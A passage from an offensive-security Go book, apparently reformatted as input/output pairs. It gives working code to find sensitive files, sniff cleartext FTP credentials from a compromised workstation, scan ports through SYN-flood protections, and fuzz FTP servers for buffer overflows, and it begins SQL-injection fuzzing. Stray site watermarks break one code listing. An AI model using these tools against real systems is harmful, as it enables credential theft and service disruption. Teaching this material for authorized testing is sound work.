    "output": "--- file1.txt\n--- yetanotherpath\n--- nada.txt\n--- passwords.xlsx\n2 directories, 5 files\nRunning your utility against this same targetpath directory\nproduces the following output, confirming that your code\nworks splendidly:\n$ go run main.go ./somepath\n[+] HIT: somepath/anotherpath/users.csv\n[+] HIT: somepath/yetanotherpath/passwords.xlsx\nThat’s just about all there is to it. You can improve the\nsample code through the inclusion of additional or more-\nspecific regular expressions. Further, we encourage you to\nimprove the code by applying the regular expression check\nonly to filenames, not directories. Another enhancement we\nencourage you to make is to locate and flag specific files with\na recent modified or access time. This metadata can lead you\nto more important content, including files used as part of\ncritical business processes.\nSUMMARY\nIn this chapter, we dove into database interactions and\nfilesystem walking, using both Go’s native packages and third-\nparty libraries to inspect database metadata and filenames. For\nan attacker, these resources often contain valuable\ninformation, and we created various utilities that allow us to\nsearch for this juicy information.\nHivaNetwork.Com\nIn the next chapter, you’ll take a look at practical packet\nprocessing. Specifically, you’ll learn how to sniff and\nmanipulate network packets."
  },
  {
    "input": "Setting Up Your Environment",
    "output": "8\nRAW PACKET PROCESSING\nIn this chapter, you’ll learn how to capture and process\nnetwork packets. You can use packet processing for many\npurposes, including to capture cleartext authentication\ncredentials, alter the application functionality of the packets,\nor spoof and poison traffic. You can also use it for SYN\nscanning and for port scanning through SYN-flood\nprotections, among other things.\nWe’ll introduce you to the excellent gopacket package from\nGoogle, which will enable you to both decode packets and\nreassemble the stream of traffic. This package allows you to\nfilter traffic by using the Berkeley Packet Filter (BPF), also\ncalled tcpdump syntax; read and write .pcap files; inspect\nvarious layers and data; and manipulate packets.\nWe’ll walk through several examples to show you how to\nidentify devices, filter results, and create a port scanner that\ncan bypass SYN-flood protections.\nSETTING UP YOUR ENVIRONMENT"
  },
  {
    "input": "Identifying Devices by Using the pcap Subpackage",
    "output": "Before working through the code in this chapter, you need to\nset up your environment. First, install gopacket by entering the\nfollowing:\n$ go get github.com/google/gopacket\nNow, gopacket relies on external libraries and drivers to\nbypass the operating system’s protocol stack. If you intend to\ncompile the examples in this chapter for use on Linux or\nmacOS, you’ll need to install libpcap-dev. You can do this with\nmost package management utilities such as apt, yum, or brew.\nHere’s how you install it by using apt (the installation process\nlooks similar for the other two options):\n$ sudo apt-get install libpcap-dev\nIf you intend to compile and run the examples in this\nchapter on Windows, you have a couple of options, based on\nwhether you’re going to cross-compile or not. Setting up a\ndevelopment environment is simpler if you don’t cross-\ncompile, but in that case, you’ll have to create a Go\ndevelopment environment on a Windows machine, which can\nbe unattractive if you don’t want to clutter another\nenvironment. For the time being, we’ll assume you have a\nworking environment that you can use to compile Windows\nbinaries. Within this environment, you’ll need to install\nWinPcap. You can download an installer for free from\nhttps://www.winpcap.org/.\nIDENTIFYING DEVICES BY USING\nTHE PCAP SUBPACKAGE\nBefore you can capture network traffic, you must identify\navailable devices on which you can listen. You can do this\neasily using the gopacket/pcap subpackage, which retrieves them\nwith the following helper function: pcap.FindAllDevs() (ifs []Interface,\nerr error). Listing 8-1 shows how you can use it to list all\navailable interfaces. (All the code listings at the root location\nof / exist under the provided github repo\nhttps://github.com/blackhat-go/bhg/.)\npackage main\nimport (\n\"fmt\"\n\"log\"\n\"github.com/google/gopacket/pcap\"\n)\nfunc main() {\n❶ devices, err := pcap.FindAllDevs()\nif err != nil {\nlog.Panicln(err)\n}\n❷ for _, device := range devices {\nfmt.Println(device.Name❸)\n❹ for _, address := range device.Addresses {\n❺ fmt.Printf(\" IP: %s\\n\", address.IP)\nfmt.Printf(\" Netmask: %s\\n\", address.Netmask)\n}\n}\n}\nListing 8-1: Listing the available network devices (/ch-8/identify/main.go)\nYou enumerate your devices by calling pcap.FindAllDevs() ❶.\nThen you loop through the devices found ❷. For each device,\nyou access various properties, including the device.Name ❸. You"
  },
  {
    "input": "Live Capturing and Filtering Results",
    "output": "also access their IP addresses through the Addresses property,\nwhich is a slice of type pcap.InterfaceAddress. You loop through\nthese addresses ❹, displaying the IP address and netmask to\nthe screen ❺.\nExecuting your utility produces output similar to Listing 8-\n2.\n$ go run main.go\nenp0s5\nIP: 10.0.1.20\nNetmask: ffffff00\nIP: fe80::553a:14e7:92d2:114b\nNetmask: ffffffffffffffff0000000000000000\nany\nlo\nIP: 127.0.0.1\nNetmask: ff000000\nIP: ::1\nNetmask: ffffffffffffffffffffffffffffffff\nListing 8-2: Output showing the available network interfaces\nThe output lists the available network interfaces—enp0s5,\nany, and lo—as well as their IPv4 and IPv6 addresses and\nnetmasks. The output on your system will likely differ from\nthese network details, but it should be similar enough that you\ncan make sense of the information.\nLIVE CAPTURING AND FILTERING\nRESULTS\nNow that you know how to query available devices, you can\nuse gopacket’s features to capture live packets off the wire. In\ndoing so, you’ll also filter the set of packets by using BPF\nsyntax. BPF allows you to limit the contents of what you\ncapture and display so that you see only relevant traffic. It’s\ncommonly used to filter traffic by protocol and port. For\nexample, you could create a filter to see all TCP traffic\ndestined for port 80. You can also filter traffic by destination\nhost. A full discussion of BPF syntax is beyond the scope of\nthis book. For additional ways to use BPF, take a peek at\nhttp://www.tcpdump.org/manpages/pcap-filter.7.html.\nListing 8-3 shows the code, which filters traffic so that you\ncapture only TCP traffic sent to or from port 80.\npackage main\nimport (\n\"fmt\"\n\"log\"\n\"github.com/google/gopacket\"\n\"github.com/google/gopacket/pcap\"\n)\n❶ var (\niface = \"enp0s5\"\nsnaplen = int32(1600)\npromisc = false\ntimeout = pcap.BlockForever\nfilter = \"tcp and port 80\"\ndevFound = false\n)\nfunc main() {\ndevices, err := pcap.FindAllDevs()❷\nif err != nil {\nlog.Panicln(err)\n}\n❸ for _, device := range devices {\nif device.Name == iface {\ndevFound = true\n}\n}\nif !devFound {\nlog.Panicf(\"Device named '%s' does not exist\\n\", iface)\n}\n❹ handle, err := pcap.OpenLive(iface, snaplen, promisc, timeout)\nif err != nil {\nlog.Panicln(err)\n}\ndefer handle.Close()\n❺ if err := handle.SetBPFFilter(filter); err != nil {\nlog.Panicln(err)\n}\n❻ source := gopacket.NewPacketSource(handle, handle.LinkType())\nfor packet := range source.Packets()❼ {\nfmt.Println(packet)\n}\n}\nListing 8-3: Using a BPF filter to capture specific network traffic (/ch-\n8/filter/main.go)\nThe code starts by defining several variables necessary to\nset up the packet capture ❶. Included among these is the name\nof the interface on which you want to capture data, the\nsnapshot length (the amount of data to capture for each frame),\nthe promisc variable (which determines whether you’ll be\nrunning promiscuous mode), and your time-out. Also, you\ndefine your BPF filter: tcp and port 80. This will make sure you\ncapture only packets that match those criteria.\nWithin your main() function, you enumerate the available\ndevices ❷, looping through them to determine whether your\ndesired capture interface exists in your device list ❸. If the\ninterface name doesn’t exist, then you panic, stating that it’s\ninvalid.\nWhat remains in the rest of the main() function is your\ncapturing logic. From a high-level perspective, you need to\nfirst obtain or create a *pcap.Handle, which allows you to read\nand inject packets. Using this handle, you can then apply a\nBPF filter and create a new packet data source, from which\nyou can read your packets.\nYou create your *pcap.Handle (named handle in the code) by\nissuing a call to pcap.OpenLive() ❹. This function receives an\ninterface name, a snapshot length, a boolean value defining\nwhether it’s promiscuous, and a time-out value. These input\nvariables are all defined prior to the main() function, as we\ndetailed previously. Call handle.SetBPFFilter(filter) to set the BPF\nfilter for your handle ❺, and then use handle as an input while\ncalling gopacket.NewPacketSource(handle, handle.LinkType()) to create a\nnew packet data source ❻. The second input value,\nhandle.LinkType(), defines the decoder to use when handling\npackets. Lastly, you actually read packets from the wire by\nusing a loop on source.Packets() ❼, which returns a channel.\nAs you might recall from previous examples in this book,\nlooping on a channel causes the loop to block when it has no\ndata to read from the channel. When a packet arrives, you read\nit and print its contents to screen.\nThe output should look like Listing 8-4. Note that the\nprogram requires elevated privileges because we’re reading\nraw content off the network.\n$ go build -o filter && sudo ./filter\nPACKET: 74 bytes, wire length 74 cap length 74 @ 2020-04-26 08:44:43.074187\n-0500 CDT\n- Layer 1 (14 bytes) = Ethernet {Contents=[..14..] Payload=[..60..]\nSrcMAC=00:1c:42:cf:57:11 DstMAC=90:72:40:04:33:c1 EthernetType=IPv4\nLength=0}\n- Layer 2 (20 bytes) = IPv4 {Contents=[..20..] Payload=[..40..] Version=4\nIHL=5\nTOS=0 Length=60 Id=998 Flags=DF FragOffset=0 TTL=64 Protocol=TCP\nChecksum=55712\nSrcIP=10.0.1.20 DstIP=54.164.27.126 Options=[] Padding=[]}\n- Layer 3 (40 bytes) = TCP {Contents=[..40..] Payload=[] SrcPort=51064\nDstPort=80(http) Seq=3543761149 Ack=0 DataOffset=10 FIN=false SYN=true\nRST=false\nPSH=false ACK=false URG=false ECE=false CWR=false NS=false\nWindow=29200\nChecksum=23908 Urgent=0 Options=[..5..] Padding=[]}\nPACKET: 74 bytes, wire length 74 cap length 74 @ 2020-04-26 08:44:43.086706\n-0500 CDT\n- Layer 1 (14 bytes) = Ethernet {Contents=[..14..] Payload=[..60..]\nSrcMAC=00:1c:42:cf:57:11 DstMAC=90:72:40:04:33:c1 EthernetType=IPv4\nLength=0}\n- Layer 2 (20 bytes) = IPv4 {Contents=[..20..] Payload=[..40..] Version=4\nIHL=5\nTOS=0 Length=60 Id=23414 Flags=DF FragOffset=0 TTL=64 Protocol=TCP\nChecksum=16919\nSrcIP=10.0.1.20 DstIP=204.79.197.203 Options=[] Padding=[]}\n- Layer 3 (40 bytes) = TCP {Contents=[..40..] Payload=[] SrcPort=37314\nDstPort=80(http) Seq=2821118056 Ack=0 DataOffset=10 FIN=false SYN=true\nRST=false\nPSH=false ACK=false URG=false ECE=false CWR=false NS=false\nWindow=29200\nChecksum=40285 Urgent=0 Options=[..5..] Padding=[]}\nListing 8-4: Captured packets logged to stdout\nAlthough the raw output isn’t very digestible, it certainly\ncontains a nice separation of each layer. You can now use\nutility functions, such as packet.ApplicationLayer() and packet.Data(), to"
  },
  {
    "input": "Sniffing and Displaying Cleartext User Credentials",
    "output": "retrieve the raw bytes for a single layer or the entire packet.\nWhen you combine the output with hex.Dump(), you can display\nthe contents in a much more readable format. Play around with\nthis on your own.\nSNIFFING AND DISPLAYING\nCLEARTEXT USER CREDENTIALS\nNow let’s build on the code you just created. You’ll replicate\nsome of the functionality provided by other tools to sniff and\ndisplay cleartext user credentials.\nMost organizations now operate by using switched\nnetworks, which send data directly between two endpoints\nrather than as a broadcast, making it harder to passively\ncapture traffic in an enterprise environment. However, the\nfollowing cleartext sniffing attack can be useful when paired\nwith something like Address Resolution Protocol (ARP)\npoisoning, an attack that can coerce endpoints into\ncommunicating with a malicious device on a switched\nnetwork, or when you’re covertly sniffing outbound traffic\nfrom a compromised user workstation. In this example, we’ll\nassume you’ve compromised a user workstation and focus\nsolely on capturing traffic that uses FTP to keep the code brief.\nWith the exception of a few small changes, the code in\nListing 8-5 is nearly identical to the code in Listing 8-3.\npackage main\nimport (\n\"bytes\"\n\"fmt\"\n\"log\"\nHivaNetwork.Com\n\"github.com/google/gopacket\"\n\"github.com/google/gopacket/pcap\"\n)\nvar (\niface = \"enp0s5\"\nsnaplen = int32(1600)\npromisc = false\ntimeout = pcap.BlockForever\n❶ filter = \"tcp and dst port 21\"\ndevFound = false\n)\nfunc main() {\ndevices, err := pcap.FindAllDevs()\nif err != nil {\nlog.Panicln(err)\n}\nfor _, device := range devices {\nif device.Name == iface {\ndevFound = true\n}\n}\nif !devFound {\nlog.Panicf(\"Device named '%s' does not exist\\n\", iface)\n}\nhandle, err := pcap.OpenLive(iface, snaplen, promisc, timeout)\nif err != nil {\nlog.Panicln(err)\n}\ndefer handle.Close()\nif err := handle.SetBPFFilter(filter); err != nil {\nlog.Panicln(err)\n}\nsource := gopacket.NewPacketSource(handle, handle.LinkType())\nfor packet := range source.Packets() {\n❷ appLayer := packet.ApplicationLayer()\nif appLayer == nil {\ncontinue\n}\n❸ payload := appLayer.Payload()\n❹ if bytes.Contains(payload, []byte(\"USER\")) {\nfmt.Print(string(payload))\n} else if bytes.Contains(payload, []byte(\"PASS\")) {\nfmt.Print(string(payload))\n}\n}\n}\nListing 8-5: Capturing FTP authentication credentials (/ch-8/ftp/main.go)\nThe changes you made encompass only about 10 lines of\ncode. First, you change your BPF filter to capture only traffic\ndestined for port 21 (the port commonly used for FTP traffic)\n❶. The rest of the code remains the same until you process the\npackets.\nTo process packets, you first extract the application layer\nfrom the packet and check to see whether it actually exists ❷,\nbecause the application layer contains the FTP commands and\ndata. You look for the application layer by examining whether\nthe response value from packet.ApplicationLayer() is nil. Assuming\nthe application layer exists in the packet, you extract the\npayload (the FTP commands/data) from the layer by calling\nappLayer.Payload() ❸. (There are similar methods for extracting\nand inspecting other layers and data, but you only need the\napplication layer payload.) With your payload extracted, you\nthen check whether the payload contains either the USER or\nPASS commands ❹, indicating that it’s part of a login\nsequence. If it does, display the payload to the screen."
  },
  {
    "input": "Port Scanning Through SYN-flood Protections",
    "output": "Here’s a sample run that captures an FTP login attempt:\n$ go build -o ftp && sudo ./ftp\nUSER someuser\nPASS passw0rd\nOf course, you can improve this code. In this example, the\npayload will be displayed if the words USER or PASS exist\nanywhere in the payload. Really, the code should be searching\nonly the beginning of the payload to eliminate false-positives\nthat occur when those keywords appear as part of file contents\ntransferred between client and server or as part of a longer\nword such as PASSAGE or ABUSER. We encourage you to make\nthese improvements as a learning exercise.\nPORT SCANNING THROUGH SYN-\nFLOOD PROTECTIONS\nIn Chapter 2, you walked through the creation of a port\nscanner. You improved the code through multiple iterations\nuntil you had a high-performing implementation that produced\naccurate results. However, in some instances, that scanner can\nstill produce incorrect results. Specifically, when an\norganization employs SYN-flood protections, typically all\nports—open, closed, and filtered alike—produce the same\npacket exchange to indicate that the port is open. These\nprotections, known as SYN cookies, prevent SYN-flood\nattacks and obfuscate the attack surface, producing false-\npositives.\nWhen a target is using SYN cookies, how can you\ndetermine whether a service is listening on a port or a device is\nfalsely showing that the port is open? After all, in both cases,\nthe TCP three-way handshake is completed. Most tools and\nscanners (Nmap included) look at this sequence (or some\nvariation of it, based on the scan type you’ve chosen) to\ndetermine the status of the port. Therefore, you can’t rely on\nthese tools to produce accurate results.\nHowever, if you consider what happens after you’ve\nestablished a connection—an exchange of data, perhaps in the\nform of a service banner—you can deduce whether an actual\nservice is responding. SYN-flood protections generally won’t\nexchange packets beyond the initial three-way handshake\nunless a service is listening, so the presence of any additional\npackets might indicate that a service exists.\nChecking TCP Flags\nTo account for SYN cookies, you have to extend your port-\nscanning capabilities to look beyond the three-way handshake\nby checking to see whether you receive any additional packets\nfrom the target after you’ve established a connection. You can\naccomplish this by sniffing the packets to see if any of them\nwere transmitted with a TCP flag value indicative of\nadditional, legitimate service communications.\nTCP flags indicate information about the state of a packet\ntransfer. If you look at the TCP specification, you’ll find that\nthe flags are stored in a single byte at position 14 in the\npacket’s header. Each bit of this byte represents a single flag\nvalue. The flag is “on” if the bit at that position is set to 1, and\n“off” if the bit is set to 0. Table 8-1 shows the positions of the\nflags in the byte, as per the TCP specification.\nTable 8-1: TCP Flags and Their Byte Positions\nBit 7 6 5 4 3 2 1 0\nFlag CWR ECE URG ACK PSH RST SYN FIN\nOnce you know the positions of the flags you care about,\nyou can create a filter that checks them. For example, you can\nlook for packets containing the following flags, which might\nindicate a listening service:\nACK and FIN\nACK\nACK and PSH\nBecause you have the ability to capture and filter certain\npackets by using the gopacket library, you can build a utility that\nattempts to connect to a remote service, sniffs the packets, and\ndisplays only the services that communicate packets with these\nTCP headers. Assume all other services are falsely “open”\nbecause of SYN cookies.\nBuilding the BPF Filter\nYour BPF filter needs to check for the specific flag values that\nindicate packet transfer. The flag byte has the following values\nif the flags we mentioned earlier are turned on:\nACK and FIN: 00010001 (0x11)\nACK: 00010000 (0x10)\nACK and PSH: 00011000 (0x18)\nWe included the hex equivalent of the binary value for\nclarity, as you’ll use the hex value in your filter.\nTo summarize, you need to check the 14th byte (offset 13\nfor a 0-based index) of the TCP header, filtering only for\npackets whose flags are 0x11, 0x10, or 0x18. Here’s what the\nBPF filter looks like:\ntcp[13] == 0x11 or tcp[13] == 0x10 or tcp[13] == 0x18\nExcellent. You have your filter.\nWriting the Port Scanner\nNow you’ll use the filter to build a utility that establishes a full\nTCP connection and inspects packets beyond the three-way\nhandshake to see whether other packets are transmitted,\nindicating that an actual service is listening. The program is\nshown in Listing 8-6. For the sake of simplicity, we’ve opted\nto not optimize the code for efficiency. However, you can\ngreatly improve this code by making optimizations similar to\nthose we made in Chapter 2.\nvar ( ❶\nsnaplen = int32(320)\npromisc = true\ntimeout = pcap.BlockForever\nfilter = \"tcp[13] == 0x11 or tcp[13] == 0x10 or tcp[13] == 0x18\"\ndevFound = false\nresults = make(map[string]int)\n)\nfunc capture(iface, target string) { ❷\nhandle, err := pcap.OpenLive(iface, snaplen, promisc, timeout)\nif err != nil {\nlog.Panicln(err)\n}\ndefer handle.Close()\nif err := handle.SetBPFFilter(filter); err != nil {\nlog.Panicln(err)\n}\nsource := gopacket.NewPacketSource(handle, handle.LinkType())\nfmt.Println(\"Capturing packets\")\nfor packet := range source.Packets() {\nnetworkLayer := packet.NetworkLayer() ❸\nif networkLayer == nil {\ncontinue\n}\ntransportLayer := packet.TransportLayer()\nif transportLayer == nil {\ncontinue\n}\nsrcHost := networkLayer.NetworkFlow().Src().String() ❹\nsrcPort := transportLayer.TransportFlow().Src().String()\nif srcHost != target { ❺\ncontinue\n}\nresults[srcPort] += 1 ❻\n}\n}\nfunc main() {\nif len(os.Args) != 4 {\nlog.Fatalln(\"Usage: main.go <capture_iface> <target_ip>\n<port1,port2,port3>\")\n}\ndevices, err := pcap.FindAllDevs()\nif err != nil {\nlog.Panicln(err)\n}\niface := os.Args[1]\nfor _, device := range devices {\nif device.Name == iface {\ndevFound = true\n}\n}\nif !devFound {\nlog.Panicf(\"Device named '%s' does not exist\\n\", iface)\n}\nip := os.Args[2]\ngo capture(iface, ip) ❼\ntime.Sleep(1 * time.Second)\nports, err := explode(os.Args[3])\nif err != nil {\nlog.Panicln(err)\n}\nfor _, port := range ports { ❽\ntarget := fmt.Sprintf(\"%s:%s\", ip, port)\nfmt.Println(\"Trying\", target)\nc, err := net.DialTimeout(\"tcp\", target, 1000*time.Millisecond) ❾\nif err != nil {\ncontinue\n}\nc.Close()\n}\ntime.Sleep(2 * time.Second)\nfor port, confidence := range results { ❿\nif confidence >= 1 {\nfmt.Printf(\"Port %s open (confidence: %d)\\n\", port, confidence)\n}\n}\n}\n/* Extraneous code omitted for brevity */\nListing 8-6: Scanning and processing packets with SYN-flood protections (/ch-\n8/syn-flood/main.go)\nBroadly speaking, your code will maintain a count of\npackets, grouped by port, to represent how confident you are\nthat the port is indeed open. You’ll use your filter to select\nonly packets with the proper flags set. The greater the count of\nmatching packets, the higher your confidence that the service\nis listening on the port.\nYour code starts by defining several variables for use\nthroughout ❶. These variables include your filter and a map\nnamed results that you’ll use to track your level of confidence\nthat the port is open. You’ll use target ports as keys and\nmaintain a count of matching packets as the map value.\nNext you define a function, capture(), that accepts the\ninterface name and target IP for which you’re testing ❷. The\nfunction itself bootstraps the packet capture much in the same\nway as previous examples. However, you must use different\ncode to process each packet. You leverage the gopacket\nfunctionality to extract the packet’s network and transport\nlayers ❸. If either of these layers is absent, you ignore the\npacket; that’s because the next step is to inspect the source IP\nand port of the packet ❹, and if there’s no transport or\nnetwork layer, you won’t have that information. You then\nconfirm that the packet source matches the IP address that\nyou’re targeting ❺. If the packet source and IP address don’t\nmatch, you skip further processing. If the packet’s source IP\nand port match your target, you increment your confidence\nlevel for the port ❻. Repeat this process for each subsequent\npacket. Each time you get a match, your confidence level\nincreases.\nIn your main() function, use a goroutine to call your capture()\nfunction ❼. Using a goroutine ensures that your packet\ncapture and processing logic runs concurrently without\nblocking. Meanwhile, your main() function proceeds to parse\nyour target ports, looping through them one by one ❽ and\ncalling net.DialTimeout to attempt a TCP connection against each\n❾. Your goroutine is running, actively watching these\nconnection attempts, looking for packets that indicate a service\nis listening.\nAfter you’ve attempted to connect to each port, process all\nof your results by displaying only those ports that have a\nconfidence level of 1 or more (meaning at least one packet\nmatches your filter for that port) ❿. The code includes several\ncalls to time.Sleep() to ensure you’re leaving adequate time to set\nup the sniffer and process packets.\nLet’s look at a sample run of the program, shown in Listing\n8-7.\n$ go build -o syn-flood && sudo ./syn-flood enp0s5 10.1.100.100\n80,443,8123,65530\nCapturing packets\nTrying 10.1.100.100:80\nTrying 10.1.100.100:443\nTrying 10.1.100.100:8123\nTrying 10.1.100.100:65530\nPort 80 open (confidence: 1)\nPort 443 open (confidence: 1)\nListing 8-7: Port-scanning results with confidence ratings\nThe test successfully determines that both port 80 and 443\nare open. It also confirms that no service is listening on ports\n8123 and 65530. (Note that we’ve changed the IP address in\nthe example to protect the innocent.)\nYou could improve the code in several ways. As learning\nexercises, we challenge you to add the following\nenhancements:\nHivaNetwork.Com"
  },
  {
    "input": "Summary",
    "output": "1. Remove the network and transport layer logic and source checks from the\ncapture() function. Instead, add additional parameters to the BPF filter to ensure\nthat you capture only packets from your target IP and ports.\n2. Replace the sequential logic of port scanning with a concurrent alternative,\nsimilar to what we demonstrated in previous chapters. This will improve\nefficiency.\n3. Rather than limiting the code to a single target IP, allow the user to supply a list\nof IPs or network blocks.\nSUMMARY\nWe’ve completed our discussion of packet captures, focusing\nprimarily on passive sniffing activities. In the next chapter,\nwe’ll focus on exploit development."
  },
  {
    "input": "Creating a Fuzzer",
    "output": "9\nWRITING AND PORTING EXPLOIT\nCODE\nIn the majority of the previous chapters, you used Go to create\nnetwork-based attacks. You’ve explored raw TCP, HTTP,\nDNS, SMB, database interaction, and passive packet\ncapturing.\nThis chapter focuses instead on identifying and exploiting\nvulnerabilities. First, you’ll learn how to create a vulnerability\nfuzzer to discover an application’s security weaknesses. Then\nyou’ll learn how to port existing exploits to Go. Finally, we’ll\nshow you how to use popular tools to create Go-friendly\nshellcode. By the end of the chapter, you should have a basic\nunderstanding of how to use Go to discover flaws while also\nusing it to write and deliver various payloads.\nCREATING A FUZZER\nFuzzing is a technique that sends extensive amounts of data to\nan application in an attempt to force the application to produce\nabnormal behavior. This behavior can reveal coding errors or\nsecurity deficiencies, which you can later exploit.\nFuzzing an application can also produce undesirable side\neffects, such as resource exhaustion, memory corruption, and\nservice interruption. Some of these side effects are necessary\nfor bug hunters and exploit developers to do their jobs but bad\nfor the stability of the application. Therefore, it’s crucial that\nyou always perform fuzzing in a controlled lab environment.\nAs with most of the techniques we discuss in this book, don’t\nfuzz applications or systems without explicit authorization\nfrom the owner.\nIn this section, you’ll build two fuzzers. The first will\ncheck the capacity of an input in an attempt to crash a service\nand identify a buffer overflow. The second fuzzer will replay\nan HTTP request, cycling through potential input values to\ndetect SQL injection.\nBuffer Overflow Fuzzing\nBuffer overflows occur when a user submits more data in an\ninput than the application has allocated memory space for. For\nexample, a user could submit 5,000 characters when the\napplication expects to receive only 5. If a program uses the\nwrong techniques, this could allow the user to write that\nsurplus data to parts of memory that aren’t intended for that\npurpose. This “overflow” corrupts the data stored within\nadjacent memory locations, allowing a malicious user to\npotentially crash the program or alter its logical flow.\nBuffer overflows are particularly impactful for network-\nbased programs that receive data from clients. Using buffer\noverflows, a client can disrupt server availability or possibly\nachieve remote code execution. It’s worth restating: don’t fuzz\nsystems or applications unless you are permitted to do so. In\naddition, make sure you fully understand the consequences of\ncrashing the system or service.\nHow Buffer Overflow Fuzzing Works\nFuzzing to create a buffer overflow generally involves\nsubmitting increasingly longer inputs, such that each\nsubsequent request includes an input value whose length is one\ncharacter longer than the previous attempt. A contrived\nexample using the A character as input would execute\naccording to the pattern shown in Table 9-1.\nBy sending numerous inputs to a vulnerable function,\nyou’ll eventually reach a point where the length of your input\nexceeds the function’s defined buffer size, which will corrupt\nthe program’s control elements, such as its return and\ninstruction pointers. At this point, the application or system\nwill crash.\nBy sending incrementally larger requests for each attempt,\nyou can precisely determine the expected input size, which is\nimportant for exploiting the application later. You can then\ninspect the crash or resulting core dump to better understand\nthe vulnerability and attempt to develop a working exploit. We\nwon’t go into debugger usage and exploit development here;\ninstead, let’s focus on writing the fuzzer.\nTable 9-1: Input Values in a Buffer Overflow Test\nAttempt Input value\n1 A\n2 AA\n3 AAA\n4 AAAA\nN A repeated N times\nIf you’ve done any manual fuzzing using modern,\ninterpreted languages, you’ve probably used a construct to\ncreate strings of specific lengths. For example, the following\nPython code, run within the interpreter console, shows how\nsimple it is to create a string of 25 A characters:\n>>> x = \"A\"*25\n>>> x\n'AAAAAAAAAAAAAAAAAAAAAAAAA'\nUnfortunately, Go has no such construct to conveniently\nbuild strings of arbitrary length. You’ll have to do that the old-\nfashioned way—using a loop—which would look something\nlike this:\nvar (\nn int\ns string\n)\nfor n = 0; n < 25; n++ {\ns += \"A\"\n}\nSure, it’s a little more verbose than the Python alternative,\nbut not overwhelming.\nThe other consideration you’ll need to make is the delivery\nmechanism for your payload. This will depend on the target\napplication or system. In some instances, this could involve\nwriting a file to a disk. In other cases, you might communicate\nover TCP/UDP with an HTTP, SMTP, SNMP, FTP, Telnet, or\nother networked service.\nIn the following example, you’ll perform fuzzing against a\nremote FTP server. You can tweak a lot of the logic we\npresent fairly quickly to operate against other protocols, so it\nshould act as a good basis for you to develop custom fuzzers\nagainst other services.\nAlthough Go’s standard packages include support for some\ncommon protocols, such as HTTP and SMTP, they don’t\ninclude support for client-server FTP interactions. Instead, you\ncould use a third-party package that already performs FTP\ncommunications, so you don’t have to reinvent the wheel and\nwrite something from the ground up. However, for maximum\ncontrol (and to appreciate the protocol), you’ll instead build\nthe basic FTP functionality using raw TCP communications. If\nyou need a refresher on how this works, refer to Chapter 2.\nBuilding The Buffer Overflow Fuzzer\nListing 9-1 shows the fuzzer code. (All the code listings at the\nroot location of / exist under the provided github repo\nhttps://github.com/blackhat-go/bhg/.) We’ve hardcoded some\nvalues, such as the target IP and port, as well as the maximum\nlength of your input. The code itself fuzzes the USER property.\nSince this property occurs before a user is authenticated, it\nrepresents a commonly testable point on the attack surface.\nYou could certainly extend this code to test other pre-\nauthentication commands, such as PASS, but keep in mind that\nif you supply a legitimate username and then keep submitting\ninputs for PASS, you might get locked out eventually.\nfunc main() {\n❶ for i := 0; i < 2500; i++ {\n❷ conn, err := net.Dial(\"tcp\", \"10.0.1.20:21\")\nif err != nil {\n❸ log.Fata lf(\"[!] Error at offset %d: %s\\n\", i, err)\n}\n❹ bufio.NewReader(conn).ReadString('\\n')\nuser := \"\"\n❺ for n := 0; n <= i; n++ {\nuser += \"A\"\n}\nraw := \"USER %s\\n\"\n❻ fmt.Fprintf(conn, raw, user)\nbufio.NewReader(conn).ReadString('\\n')\nraw = \"PASS password\\n\"\nfmt.Fprint(conn, raw)\nbufio.NewReader(conn).ReadString('\\n')\nif err := conn.Close()❼; err != nil {\n❽ log.Println(\"[!] Error at offset %d: %s\\n\", i, err)\n}\n}\n}\nListing 9-1: A buffer overflow fuzzer (/ch-9/ftp-fuzz/main.go)\nThe code is essentially one large loop, beginning at ❶.\nEach time the program loops, it adds another character to the\nusername you’ll supply. In this case, you’ll send usernames\nfrom 1 to 2,500 characters in length.\nFor each iteration of the loop, you establish a TCP\nconnection to the destination FTP server ❷. Any time you\ninteract with the FTP service, whether it’s the initial\nconnection or the subsequent commands, you explicitly read\nthe response from the server as a single line ❹. This allows\nthe code to block while waiting for the TCP responses so you\ndon’t send your commands prematurely, before packets have\nmade their round trip. You then use another for loop to build\nthe string of As in the manner we showed previously ❺. You\nuse the index i of the outer loop to build the string length\ndependent on the current iteration of the loop, so that it\nincreases by one each time the program starts over. You use\nthis value to write the USER command by using fmt.Fprintf(conn,\nraw, user)\n❻.\nAlthough you could end your interaction with the FTP\nserver at this point (after all, you’re fuzzing only the USER\ncommand), you proceed to send the PASS command to\ncomplete the transaction. Lastly, you close your connection\ncleanly ❼.\nIt’s worth noting that there are two points, ❸ and ❽,\nwhere abnormal connectivity behavior could indicate a service\ndisruption, implying a potential buffer overflow: when the\nconnection is first established and when the connection closes.\nIf you can’t establish a connection the next time the program\nloops, it’s likely that something went wrong. You’ll then want\nto check whether the service crashed as a result of a buffer\noverflow.\nIf you can’t close a connection after you’ve established it,\nthis may indicate the abnormal behavior of the remote FTP\nservice abruptly disconnecting, but it probably isn’t caused by\na buffer overflow. The anomalous condition is logged, but the\nprogram will continue.\nA packet capture, illustrated in Figure 9-1, shows that each\nsubsequent USER command grows in length, confirming that\nyour code works as desired.\nFigure 9-1: A Wireshark capture depicting the USER command growing by one\nletter each time the program loops\nYou could improve the code in several ways for flexibility\nand convenience. For example, you’d probably want to\nremove the hardcoded IP, port, and iteration values, and\ninstead include them via command line arguments or a\nconfiguration file. We invite you to perform these usability\nupdates as an exercise. Furthermore, you could extend the\ncode so it fuzzes commands after authentication. Specifically,\nyou could update the tool to fuzz the CWD/CD command.\nVarious tools have historically been susceptible to buffer\noverflows related to the handling of this command, making it a\ngood target for fuzzing.\nSQL Injection Fuzzing\nSQL Injection Fuzzing\nIn this section, you’ll explore SQL injection fuzzing. Instead\nof changing the length of each input, this variation on the\nattack cycles through a defined list of inputs to attempt to\ncause SQL injection. In other words, you’ll fuzz the username\nparameter of a website login form by attempting a list of\ninputs consisting of various SQL meta-characters and syntax\nthat, if handled insecurely by the backend database, will yield\nabnormal behavior by the application.\nTo keep things simple, you’ll be probing only for error-\nbased SQL injection, ignoring other forms, such as boolean-,\ntime-, and union-based. That means that instead of looking for\nsubtle differences in response content or response time, you’ll\nlook for an error message in the HTTP response to indicate a\nSQL injection. This implies that you expect the web server to\nremain operational, so you can no longer rely on connection\nestablishment as a litmus test for whether you’ve succeeded in\ncreating abnormal behavior. Instead, you’ll need to search the\nresponse body for a database error message.\nHow SQL Injection Works\nAt its core, SQL injection allows an attacker to insert SQL\nmeta-characters into a statement, potentially manipulating the\nquery to produce unintended behavior or return restricted,\nsensitive data. The problem occurs when developers 